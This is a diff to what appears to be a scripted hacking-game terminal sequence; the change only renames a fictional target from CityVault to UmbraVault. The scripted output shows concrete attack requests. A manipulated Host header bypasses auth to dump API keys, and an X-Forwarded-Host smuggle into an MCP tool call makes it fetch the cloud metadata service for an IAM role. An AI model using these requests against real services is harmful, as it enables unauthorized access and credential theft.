@@ -33,7 +33,7 @@ jq: error: Cannot iterate over null (null)` },
   { t:'input',  text:'curl -s http://10.13.37.7:8000/openapi.json | jq .info', stage:'RECON' },
   { t:'out', cls:'sys', text:
 `{
-  "title": "CityVault Agent Gateway",
+  "title": "UmbraVault Agent Gateway",
   "version": "0.4.2",
   "x-framework": "FastAPI",
   "x-starlette": "0.41.3"   <-- < 1.0.1 ... VULNERABLE TO CVE-2026-48710
@@ -77,12 +77,12 @@ jq: error: Cannot iterate over null (null)` },
   { t:'out', cls:'sys', text:
 `--- baseline (honest request) ---
 GET /key/info HTTP/1.1
-Host: cityvault.internal
+Host: umbravault.internal
 >>> HTTP/1.1 403 Forbidden  {"detail":"Forbidden"}` },
   { t:'out', cls:'ok', text:
 `--- THE ONE CHARACTER ---
 GET /key/info HTTP/1.1
-Host: cityvault.internal/health?x=
+Host: umbravault.internal/health?x=
 >>> HTTP/1.1 200 OK` },
   { t:'out', cls:'dim', text:
 `[*] router dispatched the REAL path /key/info ...
@@ -98,17 +98,17 @@ Host: cityvault.internal/health?x=
   { t:'out', cls:'dim', text:`[*] auth middleware is now officially a decorative hat. dumping protected data:` },
   { t:'out', cls:'sys', text:
 `GET /key/info HTTP/1.1
-Host: cityvault.internal/health?x=
+Host: umbravault.internal/health?x=
 >>> 200 OK
 {
   "keys": [
-    {"alias":"prod-openai-proxy","key":"sk-live-CITY*****REDACTED*****"},
+    {"alias":"prod-openai-proxy","key":"sk-live-UMBRA*****REDACTED*****"},
     {"alias":"agent-fleet-master","spend":"$48,201.55","models":["gpt-9","claude-omega"]}
   ]
 }` },
   { t:'out', cls:'dim', text:
 `[*] reconstructed url (what the guard SAW):
-    https://cityvault.internal/health?x=/key/info  -> path = /health  (lol)
+    https://umbravault.internal/health?x=/key/info  -> path = /health  (lol)
 [*] actual routed path (what the SERVER DID): /key/info` },
   { t:'out', cls:'warn', text:`[*] CVSS says 6.5 "Moderate". the keys in my clipboard disagree.` },
 
@@ -119,8 +119,8 @@ Host: cityvault.internal/health?x=
   { t:'out', cls:'sys', text:
 `--- smuggling into the MCP tool-exec endpoint ---
 POST /mcp HTTP/1.1
-Host: cityvault.internal/.well-known/oauth-authorization-server?x=
-X-Forwarded-Host: cityvault.internal/.well-known/oauth-authorization-server?x=
+Host: umbravault.internal/.well-known/oauth-authorization-server?x=
+X-Forwarded-Host: umbravault.internal/.well-known/oauth-authorization-server?x=
 content-type: application/json
 {"jsonrpc":"2.0","method":"tools/call","params":{"name":"fetch_url",
  "arguments":{"url":"http://169.254.169.254/latest/meta-data/iam/"}}}
@@ -128,7 +128,7 @@ content-type: application/json
   { t:'out', cls:'warn', text:`[*] proxy tried to 400 our Host... so we used X-Forwarded-Host instead. cute.` },
   { t:'out', cls:'ok', text:
 `[*] gated tool performed outbound fetch -> SSRF -> cloud metadata service
-[+] harvested instance IAM role: role/cityvault-agent-admin
+[+] harvested instance IAM role: role/umbravault-agent-admin
 [*] auth-bypass -> SSRF -> RCE-class tool exposure. textbook X41 kill-chain.` },
 
   // ---- CHUNK 6: EXFIL / WIN -----------------------------------------------
@@ -151,7 +151,7 @@ content-type: application/json
  | |___ | |  | |   | |    ___) |  __/|   <     | |   | |  |_|
   \\____|___| |_|   |_|   |____/|_|   |_|\\_\\    |_|   |_|  (o)
 
-            >>> CITY SPIES: FIREWALL DEFEATED <<<
+            >>> CITY SPIES vs UMBRA: FIREWALL DEFEATED <<<
             >>> AGENT, YOU CRACKED CVE-2026-48710 <<<` },
   { t:'out', cls:'ok', text:`spyclient@nest:~$ logout` },
   { t:'done' },
